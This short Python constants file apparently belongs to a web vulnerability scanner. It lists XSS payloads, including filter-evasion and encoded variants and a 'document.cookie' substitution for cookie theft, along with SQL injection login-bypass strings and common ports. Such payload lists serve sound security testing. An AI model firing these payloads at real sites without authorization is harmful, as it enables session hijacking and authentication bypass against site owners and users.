FORM_IDENTIFIERS = [
    'action',
    'name',
    'id'
]

FIRST_PAYLOAD_CONTENT = "666"
SECOND_PAYLOAD_CONTENT = "document.cookie"

XSS_PAYLOADS = [
    "<script>alert(REPLACE)</script>",
    "\"'><img src=x onerror=alert(REPLACE)>",
    "<svg/onload=alert(REPLACE)>",
    "';alert(REPLACE);//",
    "<scr<script>ipt>alert(REPLACE)</scr</script>ipt>",
    "%3Cscript%3Ealert(REPLACE)%3C%2Fscript%3E",
    "<body onload=alert(REPLACE)>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR 1=1 -- -",
    "admin'--",
    "' OR 'a'='a'--",
]

COMMON_PORTS = [80, 443, 8080, 22, 23, 3389, 21, 20, 25, 110, 143]
